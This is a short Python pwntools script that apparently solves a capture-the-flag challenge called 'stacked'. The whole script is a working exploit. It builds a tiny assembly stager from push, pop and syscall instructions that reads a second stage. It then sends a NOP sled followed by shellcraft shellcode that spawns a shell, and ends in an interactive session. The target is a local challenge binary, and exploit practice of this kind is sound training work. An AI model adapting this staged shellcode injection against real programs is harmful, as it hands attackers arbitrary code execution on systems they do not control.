from pwn import *

exe = ELF('./stacked')

r = process([exe.path])
#gdb.attach(r, gdbscript='b *main+98')

context.binary = exe

print(disasm(b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x0f\x05"))

code = '''
push rax
pop rdi
push rdx
push rsi
pop rdx
pop rsi
syscall
.byte 0x5f
'''

sc = asm(code)
print(disasm(sc))
print(len(sc))
r.sendline(sc)

payload = b'\x90'*len(sc) + asm(shellcraft.sh())
r.sendline(payload)
r.interactive()
